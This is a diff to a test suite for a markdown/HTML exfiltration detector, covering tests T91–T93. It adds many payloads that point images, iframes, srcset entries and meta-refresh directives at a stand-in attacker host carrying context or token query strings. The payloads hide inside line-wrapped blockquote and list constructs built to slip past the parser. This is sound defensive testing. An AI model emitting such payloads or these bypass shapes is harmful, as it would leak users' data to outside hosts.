@@ -2,7 +2,7 @@ import { readFile } from "node:fs/promises";
 import path from "node:path";
 import { fileURLToPath } from "node:url";
 import { expect, test } from "bun:test";
-import { detectExfil } from "./exfil";
+import { containerStrippedView, detectExfil } from "./exfil";
 import { detectEgress } from "./egress";
 import { runDetectors } from "./index";
 import { applyRedaction } from "../redact";
@@ -2488,4 +2488,1076 @@ test("T90: the destination-side block-container skip is linear — megabyte-scal
   }
   console.log("T90 cost measurement:\n" + timings.join("\n"));
   expect(slow).toEqual([]);
+});
+
+// ---------------------------------------------------------------------------
+// T91 — a 21st shape of the same block-container bypass class, found by an
+// independent managed review: a reference-definition or reference-use LABEL
+// (the `[...]` bracketed text) that spans a line ending inside a blockquote
+// or other block container, with the container marker REPEATED on the
+// continuation line, is never matched — even though `marked` joins the two
+// physical lines into one label and resolves the reference. T89 taught the
+// line-start scan to cross a container prefix; T90 taught the DESTINATION
+// reader to do the same; nobody extended the same skip across a newline
+// inside the LABEL itself, on either the definition side (`[label\n>
+// cont]: URL`) or the use side (`[label\n> cont][ref]` / `[label\n>
+// cont]` / `![label\n> cont][ref]`). Reproduced against `marked`, not
+// inferred: every shape below produces an `<img src>` naming the attacker
+// host pre-fix, while `detectExfil` produced ZERO findings for every one of
+// them — all four public boundaries passed the payload with
+// `redaction.state:"none"`.
+//
+// The two sides bypass INDEPENDENTLY (a wrapped definition with an
+// unwrapped use still bypasses, and a wrapped use with an unwrapped
+// definition still bypasses), because each side computes its own key
+// through `normaliseLabel`, and a raw span carrying an un-stripped `\n> `
+// artifact normalises to a key the other, correctly-single-line side never
+// produces. See the isolation tests below for each side proved alone.
+// ---------------------------------------------------------------------------
+
+test("T91: a reference LABEL that wraps behind a repeated container marker is a finding, in every CommonMark image spelling", () => {
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  // Every row here was measured against `marked` to produce an `<img src>`
+  // naming the attacker host — a genuine renderer fetch, not an
+  // over-approximation — and produced ZERO findings before this fix.
+  const fetched: Record<string, string> = {
+    // The reported bypass itself: a shortcut reference whose label (the
+    // description) wraps behind a repeated blockquote marker.
+    shortcut: `![foo bar]\n\n> [foo\n> bar]: ${U}\n`,
+    // The full reference form: the USE side's `[ref]` half is a single
+    // line; the DEFINITION side's label wraps. Isolated further below.
+    fullReference: `![alt][foo bar]\n\n> [foo\n> bar]: ${U}\n`,
+    // Collapsed: the label is the description, same as shortcut, with an
+    // explicit empty `[]` use.
+    collapsed: `![foo bar][]\n\n> [foo\n> bar]: ${U}\n`,
+    // Image nested inside a link — the README badge idiom.
+    imageInLink: `[![foo bar]](https://ci.example.com/job)\n\n> [foo\n> bar]: ${U}\n`,
+    // Doubly-nested blockquote: order/nesting is unconstrained, same as T89.
+    nestedQuote: `![foo bar]\n\n> > [foo\n> > bar]: ${U}\n`,
+    // Three physical lines, not just two.
+    threeLineWrap: `![foo bar baz]\n\n> [foo\n> bar\n> baz]: ${U}\n`,
+    // The destination itself is angle-bracketed; the label-side fix must
+    // compose with T90's destination-side fix, not just coexist with it.
+    angleDestination: `![alt][foo bar]\n\n> [foo\n> bar]: <${U}>\n`,
+    // CRLF line endings throughout, mirroring the CRLF discipline the file
+    // already applies via `LINE_TERMINATORS`.
+    crlf: `![foo bar]\r\n\r\n> [foo\r\n> bar]: ${U}\r\n`,
+  };
+
+  for (const [id, content] of Object.entries(fetched)) {
+    const matches = detectExfil(content, []);
+    expect(`${id}:${matches.length > 0}`).toBe(`${id}:true`);
+    expect(`${id}:${matches.some((m) => m.value === U)}`).toBe(`${id}:true`);
+    expect(
+      `${id}:${matches.every((m) => m.policyId === "egress.reference-link-exfil")}`,
+    ).toBe(`${id}:true`);
+    expect(`${id}:${applyRedaction(content, matches).includes(ATTACKER)}`).toBe(
+      `${id}:false`,
+    );
+
+    // Same four public boundaries T89/T90 drove this through.
+    const serialized = JSON.stringify({ note: content });
+    const persisted = prepareOutputForPersistence(GUARD_PASS, serialized);
+    expect(`${id}:${persisted.allowed}`).toBe(`${id}:true`);
+    if (persisted.allowed) {
+      expect(`${id}:${persisted.content.includes(ATTACKER)}`).toBe(`${id}:false`);
+    }
+    const transported = validateOutputForTransport({
+      format: "json",
+      value: { note: content },
+    });
+    expect(`${id}:${transported.ok}`).toBe(`${id}:true`);
+    if (transported.ok) {
+      expect(`${id}:${transported.text.includes(ATTACKER)}`).toBe(`${id}:false`);
+      expect(`${id}:${transported.redaction.state}`).toBe(`${id}:redacted`);
+    }
+  }
+});
+
+test("T91: a DEFINITION-side-only label wrap is a finding (the use side stays a single, unwrapped line)", () => {
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  // The use side, `[foo bar]`, is one physical line with no container
+  // marker anywhere near it. Only the DEFINITION's label wraps, behind a
+  // mixed blockquote+list marker on the opening line and a blockquote-only
+  // marker on the continuation (the list's own lazy, indentation-based
+  // continuation) — proving the fix is not specific to a bare `>` wrap.
+  // Measured against `marked`: this resolves and fetches the attacker host.
+  const content = `![alt][foo bar]\n\n> - [foo\n>   bar]: ${U}\n`;
+  const matches = detectExfil(content, []);
+  expect(matches.length).toBeGreaterThan(0);
+  expect(matches.some((m) => m.value === U)).toBe(true);
+  expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
+});
+
+test("T91: a USE-side-only (reference) label wrap is a finding (the definition stays a single, unwrapped line)", () => {
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  // The definition, `[foo bar]: URL`, is one physical line — already
+  // covered by T89. Only the USE side's `[ref]` half wraps, behind a
+  // repeated blockquote marker, inside the same blockquote as the
+  // definition. Measured against `marked`: this resolves and fetches the
+  // attacker host.
+  const content = `> ![alt][foo\n> bar]\n>\n> [foo bar]: ${U}\n`;
+  const matches = detectExfil(content, []);
+  expect(matches.length).toBeGreaterThan(0);
+  expect(matches.some((m) => m.value === U)).toBe(true);
+  expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
+});
+
+test("T91: the pruning-bound relaxation is necessary, not cosmetic — a deeply nested container whose raw marker bytes alone exceed any defined key's length is still a finding", () => {
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  // `readLabel`'s O(1) pre-filter rejects a candidate span when its RAW
+  // non-whitespace count exceeds the longest defined key — a NECESSARY
+  // condition only while normalisation cannot delete a non-whitespace byte.
+  // Every other T91 case above happens to keep that raw count small enough
+  // that the filter would have let it through even unfixed (each marker run
+  // is short relative to its key), so none of them alone proves the pruning
+  // bound itself needed relaxing. This one is built specifically so it does:
+  // 200 nested blockquote levels contribute 200 extra `>` bytes to the raw
+  // span on top of the label text, while the only key this document defines
+  // (`target x`, 8 characters) is far shorter. Confirmed by direct
+  // measurement during development: with `normaliseLabel`'s marker-stripping
+  // fix applied but the pruning-bound relaxation in `readLabel` reverted,
+  // this exact shape still produces ZERO findings — the raw count rejects
+  // the span before normalisation ever runs. Measured against `marked`: this
+  // resolves and fetches the attacker host.
+  const nestedQuote = "> ".repeat(200);
+  const content = `${nestedQuote}![alt][target\n${nestedQuote}x]\n\n[target x]: ${U}\n`;
+  const matches = detectExfil(content, []);
+  expect(matches.length).toBeGreaterThan(0);
+  expect(matches.some((m) => m.value === U)).toBe(true);
+  expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
+});
+
+test("T91: controls are unaffected — no-container label wrap, single-line label in quote (T89), destination wrap in quote (T90)", () => {
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  const controls: Record<string, string> = {
+    noContainer_labelWraps: `![foo\nbar]\n\n[foo\nbar]: ${U}\n`,
+    singleLineLabel_inQuote_T89: `![foo]\n\n> [foo]: ${U}\n`,
+    destWraps_inQuote_T90: `![foo]\n\n> [foo]:\n> ${U}\n`,
+    // A bullet's own lazy (indentation-based, marker-omitted) continuation
+    // already resolved a wrapped label before this fix — no marker byte
+    // was ever misread, so this repair must not move it.
+    bulletLazyContinuation_labelWraps: `![foo bar]\n\n- [foo\n  bar]: ${U}\n`,
+  };
+  for (const [id, content] of Object.entries(controls)) {
+    const matches = detectExfil(content, []);
+    expect(`${id}:${matches.length}`).toBe(`${id}:1`);
+    expect(`${id}:${matches[0]?.value}`).toBe(`${id}:${U}`);
+  }
+});
+
+test("T91: shapes the renderer does not resolve are still flagged, not released — over-approximation, not a contract", () => {
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  // Measured against `marked`: none of these produce an `<img src>` for the
+  // attacker host — a REPEATED list marker (bullet or ordered) on a label's
+  // continuation line starts a NEW list item rather than continuing the
+  // same label, exactly the distinction T90 already documented for the
+  // destination side. `skipBlockContainerPrefix` does not model that
+  // distinction (by design, same as T89/T90), so these are flagged anyway —
+  // this floor's stated direction is over-flag, never release. Pinned here
+  // as a fact about this repair, not a silent side effect.
+  const notActuallyFetched: Record<string, string> = {
+    bulletRepeatedMarker_newListItem: `![alt][foo bar]\n\n- [foo\n- bar]: ${U}\n`,
+    mixedQuoteThenBulletRepeated_newListItem: `![alt][foo bar]\n\n> - [foo\n> - bar]: ${U}\n`,
+  };
+  for (const [id, content] of Object.entries(notActuallyFetched)) {
+    expect(`${id}:${detectExfil(content, []).length > 0}`).toBe(`${id}:true`);
+  }
+});
+
+test("T91: a label wrap inside a fenced code block still flags (over-approximation direction preserved)", () => {
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  const content = "```\n> [foo\n> bar]: " + U + "\n```\n\n![foo bar]\n";
+  const matches = detectExfil(content, []);
+  expect(matches.length).toBeGreaterThan(0);
+  expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
+});
+
+// COST (T91). `normaliseLabel`'s new per-line skip, and the matching skip
+// `indexContent` now runs to keep the pruning bound in `readLabel` sound
+// (see the comment there), must both stay linear — see the comments above
+// `normaliseLabel` and inside `indexContent` in exfil.ts for the proof.
+// Measured on megabyte-scale adversarial input: many short labels each
+// wrapped once behind a long nested-marker run, AND one single label
+// spanning thousands of lines each carrying a nested-marker run — the
+// worst case for one `normaliseLabel` call's own cost.
+test("T91: the label-side block-container skip is linear — megabyte-scale wrapped, nested-marker labels complete well under a second", () => {
+  const BUDGET_MS = 900;
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  const nestedPrefix = "> - 1. ".repeat(40); // 280 bytes, deeply nested, alternating
+  const lineCount = 3000; // ~1 MB across many wrapped, nested-marker labels
+  const manyLinesInOneLabel = 4000; // one label spanning this many wrapped lines
+  const shapes: Record<string, string> = {
+    manyWrappedNestedLabels: Array.from(
+      { length: lineCount },
+      (_, i) => `[k${i}\n${nestedPrefix}x${i}]: https://ok.example.org/x\n`,
+    ).join(""),
+    // One single label spanning many lines, each carrying a nested-marker
+    // run — the worst case for ONE `normaliseLabel` call.
+    oneLabelManyWrappedLines:
+      "[" +
+      Array.from(
+        { length: manyLinesInOneLabel },
+        (_, i) => `l${i}\n${nestedPrefix}`,
+      ).join("") +
+      "]: https://ok.example.org/x\n",
+    // The real bypass shape at scale: many wrapped, nested, allowlisted
+    // labels, then one wrapped, nested-marker label carrying the attacker
+    // host, defined and used.
+    wrappedLabelsThenAttacker:
+      Array.from(
+        { length: 2500 },
+        (_, i) => `[k${i}\n${nestedPrefix}x${i}]: https://ok.example.org/x\n`,
+      ).join("") +
+      `![alt][target\n${nestedPrefix}x]\n\n[target\n${nestedPrefix}x]: ${U}\n`,
+  };
+  const slow: string[] = [];
+  const timings: string[] = [];
+  for (const [id, text] of Object.entries(shapes)) {
+    const started = performance.now();
+    const matches = detectExfil(text, []);
+    const elapsed = performance.now() - started;
+    timings.push(`${id}: ${text.length} bytes in ${elapsed.toFixed(1)}ms`);
+    if (elapsed >= BUDGET_MS) slow.push(`${id}=${elapsed.toFixed(1)}ms`);
+    if (id === "wrappedLabelsThenAttacker") {
+      expect(matches.some((m) => m.value === U)).toBe(true);
+    }
+  }
+  console.log("T91 cost measurement:\n" + timings.join("\n"));
+  expect(slow).toEqual([]);
+});
+
+// ---------------------------------------------------------------------------
+// T92 — a 22nd shape of the block-container bypass class, and the one
+// RESIDUALS.md recorded as an open residual after T91: a reference USE's
+// SECOND bracket (`![desc][HERE]`) whose only content, once you cross the
+// line ending, is a REPEATED container marker and nothing else —
+// `![foo bar][\n> ]`, `![foo bar][\n- ]`, every marker kind T89-T91 already
+// enumerate, nested or not, LF or CRLF. `spanHasNonWhitespace` decided
+// whether that bracket was an explicit full-reference label from the RAW,
+// un-stripped non-whitespace byte count, so the marker byte alone made it
+// answer "yes" — the full-reference branch ran, `readLabel` then normalised
+// the very same bytes (which DOES strip the marker, per T91) down to `""`,
+// and an empty label matches no key in the table. `marked` resolves the
+// construct through its SHORTCUT fallback instead (the description, not the
+// hollow second bracket) and fetches. Reproduced against `marked`, not
+// inferred: every row in the first test below produces an `<img src>` naming
+// the attacker host pre-fix, while `detectExfil` produced ZERO findings for
+// every one of them.
+// ---------------------------------------------------------------------------
+
+test("T92: a reference USE whose second bracket is only a repeated container marker still resolves via the renderer's shortcut fallback, and is a finding", () => {
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  // Every row measured against `marked` to produce an `<img src>` naming the
+  // attacker host — a genuine renderer fetch via the shortcut fallback, not
+  // an over-approximation — and produced ZERO findings before this fix.
+  const fetched: Record<string, string> = {
+    // The exact bypass named by the orchestrator, all three variants.
+    blockquote_topLevelDefinition: `![foo bar][\n> ]\n\n[foo bar]: ${U}\n`,
+    blockquote_quotedDefinition: `![foo bar][\n> ]\n\n> [foo bar]: ${U}\n`,
+    bullet_topLevelDefinition: `![foo bar][\n- ]\n\n[foo bar]: ${U}\n`,
+    // Enumerated further: every marker kind CommonMark defines for a
+    // non-indented container (T89's own enumeration), alone.
+    ordered_dot: `![foo bar][\n1. ]\n\n[foo bar]: ${U}\n`,
+    ordered_paren: `![foo bar][\n1) ]\n\n[foo bar]: ${U}\n`,
+    asteriskBullet: `![foo bar][\n* ]\n\n[foo bar]: ${U}\n`,
+    plusBullet: `![foo bar][\n+ ]\n\n[foo bar]: ${U}\n`,
+    // Nesting is unconstrained, same as T89/T90/T91.
+    nestedBlockquote: `![foo bar][\n> > ]\n\n[foo bar]: ${U}\n`,
+    mixedQuoteThenBullet: `![foo bar][\n> - ]\n\n[foo bar]: ${U}\n`,
+    // The definition itself doubly nested, independent of the use's own
+    // (unnested) marker.
+    nestedQuotedDefinition: `![foo bar][\n> ]\n\n> > [foo bar]: ${U}\n`,
+    // CRLF line endings throughout, the same discipline T89-T91 each pinned.
+    crlfBlockquote: `![foo bar][\r\n> ]\r\n\r\n[foo bar]: ${U}\r\n`,
+    crlfBullet: `![foo bar][\r\n- ]\r\n\r\n[foo bar]: ${U}\r\n`,
+  };
+
+  for (const [id, content] of Object.entries(fetched)) {
+    const matches = detectExfil(content, []);
+    expect(`${id}:${matches.length > 0}`).toBe(`${id}:true`);
+    expect(`${id}:${matches.some((m) => m.value === U)}`).toBe(`${id}:true`);
+    expect(
+      `${id}:${matches.every((m) => m.policyId === "egress.reference-link-exfil")}`,
+    ).toBe(`${id}:true`);
+    expect(`${id}:${applyRedaction(content, matches).includes(ATTACKER)}`).toBe(
+      `${id}:false`,
+    );
+
+    // Same four public boundaries T89-T91 drove this through.
+    const serialized = JSON.stringify({ note: content });
+    const persisted = prepareOutputForPersistence(GUARD_PASS, serialized);
+    expect(`${id}:${persisted.allowed}`).toBe(`${id}:true`);
+    if (persisted.allowed) {
+      expect(`${id}:${persisted.content.includes(ATTACKER)}`).toBe(`${id}:false`);
+    }
+    const transported = validateOutputForTransport({
+      format: "json",
+      value: { note: content },
+    });
+    expect(`${id}:${transported.ok}`).toBe(`${id}:true`);
+    if (transported.ok) {
+      expect(`${id}:${transported.text.includes(ATTACKER)}`).toBe(`${id}:false`);
+      expect(`${id}:${transported.redaction.state}`).toBe(`${id}:redacted`);
+    }
+  }
+});
+
+test("T92: the DEFINITION-side analogue of the same degenerate shape does not need this fix — a reference definition whose own label is only a repeated marker registers no key, on either side of the change", () => {
+  // Measured against `marked`: this does NOT resolve to the attacker host —
+  // the marker-only definition label also normalises to empty on the
+  // renderer's side, so it defines nothing usable, and the unrelated
+  // `![foo bar]` shortcut a few lines down resolves against the OTHER,
+  // properly-defined `[foo bar]: https://ok.example.org/x` instead.
+  // `readReferenceDefinitions`'s `register` already runs the raw label
+  // through `normaliseLabel` directly — the same function this fix reuses —
+  // and rejects an empty result before ever storing a key, so there is no
+  // second raw-byte-counting site on the definition side to carry T92's
+  // mistake. Pinned as a control, not inferred.
+  const attackerUrl = `https://${ATTACKER}/p?ctx=CTX`;
+  const content =
+    `[\n> ]: ${attackerUrl}\n\n` +
+    `![foo bar]\n\n[foo bar]: https://ok.example.org/x\n`;
+  const matches = detectExfil(content, []);
+  expect(matches.some((m) => m.value === attackerUrl)).toBe(false);
+  expect(matches.some((m) => m.value === "https://ok.example.org/x")).toBe(true);
+});
+
+test("T92: controls are unaffected — a genuine full reference, a genuine collapsed reference, and a label that legitimately wraps without any marker all still resolve exactly as before", () => {
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  const controls: Record<string, string> = {
+    genuineFullReference_sameLine: `![alt][foo bar]\n\n[foo bar]: ${U}\n`,
+    genuineCollapsed_sameLine: `![foo bar][]\n\n[foo bar]: ${U}\n`,
+    genuineShortcut_sameLine: `![foo bar]\n\n[foo bar]: ${U}\n`,
+    // A label that wraps across a line with NO container marker at all: the
+    // second bracket's raw content is real text, not a marker, so this must
+    // stay on the full-reference branch exactly as before T92.
+    realLabelWrapsNoMarker: `![alt][foo\nbar]\n\n[foo bar]: ${U}\n`,
+    // T91's own already-covered shape: a label that wraps BEHIND a marker
+    // but carries real text alongside it, inside a matching container.
+    realLabelWrapsBehindMarker_T91: `> ![alt][foo\n> bar]\n>\n> [foo bar]: ${U}\n`,
+  };
+  for (const [id, content] of Object.entries(controls)) {
+    const matches = detectExfil(content, []);
+    expect(`${id}:${matches.length}`).toBe(`${id}:1`);
+    expect(`${id}:${matches[0]?.value}`).toBe(`${id}:${U}`);
+  }
+});
+
+// COST (T92). `spanHasNonWhitespace` now slices and strips a span that
+// crosses a line terminator, charged against the SAME `budget.work` counter
+// `readLabel` already charges — see the comment above it in exfil.ts for why
+// that reuse, not a new independent budget, is what keeps this linear. Two
+// shapes stress the two ways this file has gone quadratic before:
+//   - many opening brackets sharing the IDENTICAL second-bracket span (the
+//     `"[".repeat(n) + "](URL)"` amplification `readInlineDestination`'s own
+//     comment describes, replayed here with a marker-only second bracket
+//     instead of a destination) — the shape that would make an unmemoised,
+//     unbudgeted strip-and-check O(n · width);
+//   - many INDEPENDENT marker-only second brackets at megabyte scale — the
+//     realistic worst case, one budget charge per distinct span.
+test("T92: the second-bracket emptiness check is linear — megabyte-scale shared and independent marker-only second brackets complete well under a second", () => {
+  const BUDGET_MS = 900;
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  const nestedMarker = "> - 1. ".repeat(40); // 280 bytes, deeply nested, alternating
+  const sharedOpens = 250000; // every one shares the SAME second-bracket span
+  const independentCount = 6000; // ~1 MB across many distinct marker-only spans
+  const shapes: Record<string, string> = {
+    // T78#F-001/T84#F-001's own amplification shape: `sharedOpens` unclosed
+    // `![` opens all resolve their "first `]`" to the SAME single close, so
+    // every one of them asks `spanHasNonWhitespace` about the IDENTICAL
+    // (start, end) pair.
+    manyOpensSharingOneMarkerOnlySecondBracket:
+      "![".repeat(sharedOpens) +
+      `x][\n${nestedMarker}]\n\n[x]: https://ok.example.org/x\n`,
+    manyIndependentMarkerOnlySecondBrackets: Array.from(
+      { length: independentCount },
+      (_, i) => `![k${i}][\n${nestedMarker}]\n\n[k${i}]: https://ok.example.org/x\n`,
+    ).join(""),
+    // The real bypass shape at scale: many independent, allowlisted,
+    // marker-only-second-bracket shortcuts, then one carrying the attacker
+    // host, to prove the finding still surfaces under cost pressure.
+    manyThenAttacker:
+      Array.from(
+        { length: independentCount },
+        (_, i) => `![k${i}][\n${nestedMarker}]\n\n[k${i}]: https://ok.example.org/x\n`,
+      ).join("") + `![target][\n${nestedMarker}]\n\n[target]: ${U}\n`,
+  };
+  const slow: string[] = [];
+  const timings: string[] = [];
+  for (const [id, text] of Object.entries(shapes)) {
+    const started = performance.now();
+    const matches = detectExfil(text, []);
+    const elapsed = performance.now() - started;
+    timings.push(`${id}: ${text.length} bytes in ${elapsed.toFixed(1)}ms`);
+    if (elapsed >= BUDGET_MS) slow.push(`${id}=${elapsed.toFixed(1)}ms`);
+    if (id === "manyThenAttacker") {
+      expect(matches.some((m) => m.value === U)).toBe(true);
+    }
+  }
+  console.log("T92 cost measurement:\n" + timings.join("\n"));
+  expect(slow).toEqual([]);
+});
+
+// T92 direction, exercised rather than only argued. `spanHasNonWhitespace`
+// charges the SAME `budget.work` counter `readLabel` does, and on exhaustion
+// it answers `true` (never seen precisely) rather than `false` (guessed
+// empty) — see the comment above the function for why either choice is safe,
+// because `budget.exhausted` alone is what triggers `detectExfil`'s
+// flag-every-definition fallback (T78#F-001). This shape is arithmetically
+// guaranteed to exhaust the budget FROM spanHasNonWhitespace's own charging,
+// not from readLabel's: `sharedOpens` (250 000) images share one
+// ~281-byte second-bracket span (the same amplification as the cost test
+// above), so the span is charged repeatedly long before all opens are
+// visited — budget.work starts at `LABEL_WORK_FACTOR * content.length`
+// (~8 × 500 KB ≈ 4.0M) and is consumed after roughly 4.0M / 281 ≈ 14 300
+// charges, a small fraction of the 250 000 opens sharing that span — well
+// before the scan ever reaches the SEPARATE, later attacker construct. The
+// attacker's finding therefore cannot come from ordinary resolution of ITS
+// OWN construct in the normal case; this test is what tells the two apart
+// from the exhaustion fallback and confirms the fallback still fires.
+test("T92: when the second-bracket check itself exhausts the shared budget, the fallback still flags the attacker construct — never a release", () => {
+  const U = `https://${ATTACKER}/p?ctx=CTX`;
+  const nestedMarker = "> - 1. ".repeat(40);
+  const sharedOpens = 250000;
+  const content =
+    "![".repeat(sharedOpens) +
+    `x][\n${nestedMarker}]\n\n[x]: https://ok.example.org/x\n` +
+    `![target][\n${nestedMarker}]\n\n[target]: ${U}\n`;
+  const matches = detectExfil(content, []);
+  expect(matches.some((m) => m.value === U)).toBe(true);
+  expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
+});
+
+// ---------------------------------------------------------------------------
+// T93 — the CLASS, not its fifth member.
+//
+// Four rounds (T89, T90, T91, T92) each closed ONE reader that crosses a line
+// terminator without consuming the block-container marker a renderer repeats on
+// the continuation line, and each declared the class closed. The enumeration
+// this round required found five more members, in two families:
+//
+//   A. the markdown INLINE destination (`![a](\n> URL)`) — `INLINE_DESTINATION`
+//      crossed the newline through its own `\s*` prefix and took the marker byte
+//      as the destination, exactly the way `REFERENCE_DESTINATION` did before
+//      T90. Closed the same way T90 closed that one: by calling
+//      `skipDestinationLeadingWhitespace`, the SAME helper, rather than by
+//      writing a sixth spelling of the marker grammar.
+//   B-E. four HTML readers — the start tag's attribute-list whitespace skips
+//      (`<img\n> src=…>`), the quoted attribute VALUE (`src="https://\n> host/"`),
+//      the `srcset` candidate list, and the `<meta refresh>` directive. These
+//      are NOT closed one by one: the HTML pass is run a second time over the
+//      renderer's OWN view of the document — the content with block-container
+//      prefixes removed — with every offset mapped back to the original bytes.
+//      Any future HTML reader is covered by construction.
+//
+// Every case below was measured against `marked` in a scratch probe before it
+// was written here (renderer fetches / detector found nothing), not inferred.
+// ---------------------------------------------------------------------------
+
+// FAMILY A. The inline destination wraps and the continuation line repeats the
+// container marker. `marked` resolves the image through the repeated marker and
+// emits `<img src="https://attacker.invalid/…">`; the floor produced ZERO
+// findings, because `\s*` landed on the `>` and `[^)\s]+` took that one byte as
+// the whole destination.
+test("T93: an inline image destination that wraps behind a repeated container marker is a finding", () => {
+  const U = `https://${ATTACKER}/p.png?ctx=CTX`;
+  const shapes: Record<string, string> = {
+    blockquoteBare: `> ![a](\n> ${U})\n`,
+    blockquoteAngle: `> ![a](\n> <${U}>)\n`,
+    blockquoteCrlf: `> ![a](\r\n> ${U})\r\n`,
+    blockquoteNested: `> > ![a](\n> > ${U})\n`,
+    blockquoteTab: `> ![a](\n>${TAB}${U})\n`,
+    blockquoteImageInLink: `> [![a](\n> ${U})](https://ok.example.org/c)\n`,
+    blockquoteExtraSpaces: `>   ![a](\n>   ${U}   )\n`,
+  };
+  const released: string[] = [];
+  for (const [id, content] of Object.entries(shapes)) {
+    const matches = detectExfil(content, []);
+    const found = matches.some((m) => m.value.includes(ATTACKER));
+    const redacted = applyRedaction(content, matches);
+    if (!found || redacted.includes(ATTACKER)) released.push(id);
+  }
+  expect(released).toEqual([]);
+});
+
+// Direction, family A: the same wrap with no container marker on the
+// continuation line, and ordinary same-line destinations, are unchanged.
+test("T93: family-A controls are unaffected — same-line destinations, an unprefixed wrap, an allowlisted host and an empty destination", () => {
+  const U = `https://${ATTACKER}/p.png`;
+  expect(detectExfil(`![a](${U})`, []).length).toBe(1);
+  expect(detectExfil(`> ![a](\n${U})\n`, []).length).toBe(1);
+  expect(detectExfil(`> ![a](\n> ${U})\n`, ["ok.example.org"]).length).toBe(1);
+  expect(
+    detectExfil(`> ![a](\n> https://ok.example.org/p.png)\n`, ["ok.example.org"])
+      .length,
+  ).toBe(0);
+  expect(detectExfil(`> ![a](\n> )\n`, []).length).toBe(0);
+  expect(detectExfil(`![a]()`, []).length).toBe(0);
+  expect(detectExfil(`![a](   )`, []).length).toBe(0);
+  // A link's destination still needs a credential locator to be a finding.
+  expect(detectExfil(`> [a](\n> ${U})\n`, []).length).toBe(0);
+  expect(
+    detectExfil(`> [a](\n> https://${ATTACKER}/x?token=SECRET)\n`, []).length,
+  ).toBe(1);
+});
+
+// FAMILY B-E. Four HTML readers, closed by one container-stripped view rather
+// than by four edits. Each shape below was measured fetching in `marked` and
+// producing zero findings here.
+test("T93: every HTML reader that crosses a line terminator is covered by the container-stripped view", () => {
+  const U = `https://${ATTACKER}/p.png`;
+  const shapes: Record<string, string> = {
+    // B — the attribute-list whitespace skips: the `>` a renderer strips as a
+    // blockquote marker is what `readStartTag` reads as the end of the tag.
+    tagWrapQuoted: `> <img\n> src="${U}">\n`,
+    tagWrapIframe: `> <iframe\n> src="${U}"></iframe>\n`,
+    tagWrapCrlf: `> <img\r\n> src="${U}">\r\n`,
+    tagWrapBeforeValue: `> <img src=\n> "${U}">\n`,
+    tagWrapVideoPoster: `> <video\n> poster="${U}"></video>\n`,
+    tagWrapBase: `> <base\n> href="${U}">\n`,
+    // C — the quoted attribute VALUE itself wraps.
+    valueWrap: `> <img src="https://\n> ${ATTACKER}/p.png">\n`,
+    valueWrapNested: `> > <img src="https://\n> > ${ATTACKER}/p.png">\n`,
+    // D — a `srcset` candidate wraps.
+    srcsetWrap: `> <img srcset="a.png 1x,\n> ${U} 2x">\n`,
+    // E — the `<meta http-equiv=refresh>` directive wraps.
+    metaRefreshWrap: `> <meta http-equiv="refresh" content="0;url=\n> ${U}">\n`,
+  };
+  const released: string[] = [];
+  for (const [id, content] of Object.entries(shapes)) {
+    const matches = detectExfil(content, []);
+    const found = matches.length > 0;
+    const redacted = applyRedaction(content, matches);
+    if (!found || redacted.includes(ATTACKER)) released.push(id);
+  }
+  expect(released).toEqual([]);
+});
+
+// Offsets. A finding the stripped view produced must report a span in the
+// ORIGINAL bytes — never one in the rewritten copy — so `content.slice(start,
+// end)` must be exactly the finding's own value, and redaction must remove the
+// attacker host from the original text.
+test("T93: findings from the container-stripped view carry offsets into the ORIGINAL bytes", () => {
+  const U = `https://${ATTACKER}/p.png`;
+  for (const content of [
+    `> <img\n> src="${U}">\n`,
+    `> <img src="https://\n> ${ATTACKER}/p.png">\n`,
+    `> <img srcset="a.png 1x,\n> ${U} 2x">\n`,
+    `> <meta http-equiv="refresh" content="0;url=\n> ${U}">\n`,
+    `> ![a](\n> ${U})\n`,
+  ]) {
+    const matches = detectExfil(content, []);
+    expect(matches.length).toBeGreaterThan(0);
+    for (const match of matches) {
+      expect(match.start).toBeGreaterThanOrEqual(0);
+      expect(match.end).toBeLessThanOrEqual(content.length);
+      expect(content.slice(match.start, match.end)).toBe(match.value);
+    }
+    expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
+  }
+});
+
+// Direction, families B-E: the view only ADDS. Every ordinary HTML shape keeps
+// exactly the findings it had, at exactly the offsets it had, and a document
+// with no container marker anywhere never builds a view at all.
+test("T93: HTML controls are unaffected — no-container documents, allowlisted hosts, and quoted-attribute markup stay exactly as they were", () => {
+  const U = `https://${ATTACKER}/p.png`;
+  expect(detectExfil(`<img src="${U}">`, []).length).toBe(1);
+  expect(detectExfil(`> <img src="${U}">`, []).length).toBe(1);
+  expect(detectExfil(`> <img src="${U}">`, [ATTACKER]).length).toBe(0);
+  expect(detectExfil(`> <img\n> src="${U}">\n`, [ATTACKER]).length).toBe(0);
+  // T53#F-004: markup written inside another element's quoted attribute value
+  // is still not an element, view or no view.
+  expect(
+    detectExfil(`> <img alt="<img src=${U}>" src="/a.png">\n`, []).length,
+  ).toBe(0);
+  // A non-image input's `src` still fetches nothing, across a wrap.
+  expect(detectExfil(`> <input\n> type="text" src="${U}">\n`, []).length).toBe(0);
+  expect(detectExfil(`> <input\n> type="image" src="${U}">\n`, []).length).toBe(1);
+});
+
+// Over-approximation is preserved in the direction this floor is allowed to err:
+// a wrapped construct a renderer would NOT resolve is still flagged, never
+// released.
+test("T93: shapes the renderer does not resolve are still flagged, not released — over-approximation, not a contract", () => {
+  const U = `https://${ATTACKER}/p.png`;
+  // `marked` splits these into separate list items and emits no image, but the
+  // floor does not model block structure and flags them anyway.
+  expect(detectExfil(`- ![a](\n- ${U})\n`, []).length).toBeGreaterThan(0);
+  expect(detectExfil(`1. ![a](\n1. ${U})\n`, []).length).toBeGreaterThan(0);
